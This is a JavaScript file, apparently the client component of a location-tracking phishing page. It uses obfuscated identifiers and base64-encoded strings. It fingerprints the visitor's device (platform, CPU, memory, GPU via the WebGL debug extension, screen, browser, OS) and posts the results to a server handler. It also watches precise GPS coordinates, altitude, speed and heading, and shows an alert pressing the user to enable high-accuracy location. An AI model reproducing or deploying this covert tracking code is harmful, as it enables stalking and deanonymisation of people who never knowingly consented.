function information() {
  var _0x3f8009 = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var _0xd4b472 = navigator.deviceMemory;
  var _0x80c573 = navigator.userAgent;
  var _0x4e54ba = _0x80c573;
  var os = _0x80c573;
  //gpu
  var _0x592304 = document.createElement('_0x592304');
  var gl;
  var _0xd7690a;
  var _0xe13da8;
  var _0xa7b74f;


  if (cc == undefined) {
    cc = 'Not Available';
  }

  //_0xd4b472
  if (_0xd4b472 == undefined) {
    _0xd4b472 = 'Not Available';
  }

  //browser
  if (_0x80c573.indexOf('Firefox') != -1) {
    _0x4e54ba = _0x4e54ba.substring(_0x4e54ba.indexOf(' Firefox/') + 1);
    _0x4e54ba = _0x4e54ba.split(' ');
    brw = _0x4e54ba[0];
  }
  else if (_0x80c573.indexOf('Chrome') != -1) {
    _0x4e54ba = _0x4e54ba.substring(_0x4e54ba.indexOf(' Chrome/') + 1);
    _0x4e54ba = _0x4e54ba.split(' ');
    brw = _0x4e54ba[0];
  }
  else if (_0x80c573.indexOf('Safari') != -1) {
    _0x4e54ba = _0x4e54ba.substring(_0x4e54ba.indexOf(' Safari/') + 1);
    _0x4e54ba = _0x4e54ba.split(' ');
    brw = _0x4e54ba[0];
  }
  else if (_0x80c573.indexOf('Edge') != -1) {
    _0x4e54ba = _0x4e54ba.substring(_0x4e54ba.indexOf(' Edge/') + 1);
    _0x4e54ba = _0x4e54ba.split(' ');
    brw = _0x4e54ba[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = _0x592304.getContext('webgl') || _0x592304.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    _0xd7690a = gl.getExtension(atob("V0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbw=="));
    _0xe13da8 = gl.getParameter(_0xd7690a.UNMASKED_VENDOR_WEBGL);
    _0xa7b74f = gl.getParameter(_0xd7690a.UNMASKED_RENDERER_WEBGL);
  }
  if (_0xe13da8 == undefined) {
    _0xe13da8 = 'Not Available';
  }
  if (_0xa7b74f == undefined) {
    _0xa7b74f = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();
  //
  $.ajax({
    type: atob("UE9TVA=="),
    url: atob("aW5mb19oYW5kbGVy"),
    data: { Ptf: _0x3f8009, Brw: brw, Cc: cc, Ram: _0xd4b472, Ven: _0xe13da8, Ren: _0xa7b74f, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: atob("dGV4dA==")
  });
}



function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var _0xc6ee1d = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    var _0xdc68d1 = navigator.geolocation.watchPosition(showPosition, showError, _0xc6ee1d);
    // Auto-clear watch after 5 minutes to avoid battery drain
    setTimeout(function() { navigator.geolocation.clearWatch(_0xdc68d1); }, 300000);
  }

  var _0xad2cb8 = true;

  function showError(error) {
    var _0xbedb78;
    var _0xb81125 = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        _0xbedb78 = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        _0xbedb78 = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        _0xbedb78 = 'The request to get user location timed out';
        alert('Please set your location mode on high accuracy...');
        break;
      case error.UNKNOWN_ERROR:
        _0xbedb78 = 'An unknown error occurred';
        break;
    }

    $.ajax({
      type: atob("UE9TVA=="),
      url: atob("ZXJyb3JfaGFuZGxlcg=="),
      data: { Status: _0xb81125, Error: _0xbedb78 },
      success: errCallback(error, _0xbedb78),
      mimeType: atob("dGV4dA==")
    });
  }
  function showPosition(position) {
    var _0xb90bf5 = position.coords.latitude;
    if (_0xb90bf5) {
      _0xb90bf5 = _0xb90bf5 + ' deg';
    }
    else {
      _0xb90bf5 = 'Not Available';
    }
    var _0x4eb441 = position.coords.longitude;
    if (_0x4eb441) {
      _0x4eb441 = _0x4eb441 + ' deg';
    }
    else {
      _0x4eb441 = 'Not Available';
    }
    var _0xdeec3f = position.coords.accuracy;
    if (_0xdeec3f) {
      _0xdeec3f = _0xdeec3f + ' m';
    }
    else {
      _0xdeec3f = 'Not Available';
    }
    var _0xa73d4c = position.coords.altitude;
    if (_0xa73d4c) {
      _0xa73d4c = _0xa73d4c + ' m';
    }
    else {
      _0xa73d4c = 'Not Available';
    }
    var _0x261700 = position.coords.heading;
    if (_0x261700) {
      _0x261700 = _0x261700 + ' deg';
    }
    else {
      _0x261700 = 'Not Available';
    }
    var _0x192a50 = position.coords.speed;
    if (_0x192a50) {
      _0x192a50 = _0x192a50 + ' m/s';
    }
    else {
      _0x192a50 = 'Not Available';
    }

    var _0x2baf29 = 'success';

    $.ajax({
      type: atob("UE9TVA=="),
      url: atob("cmVzdWx0X2hhbmRsZXI="),
      data: { Status: _0x2baf29, Lat: _0xb90bf5, Lon: _0x4eb441, Acc: _0xdeec3f, Alt: _0xa73d4c, Dir: _0x261700, Spd: _0x192a50 },
      success: _0xad2cb8 ? callback : function(){},
      mimeType: atob("dGV4dA==")
    });
    _0xad2cb8 = false;
  };
}

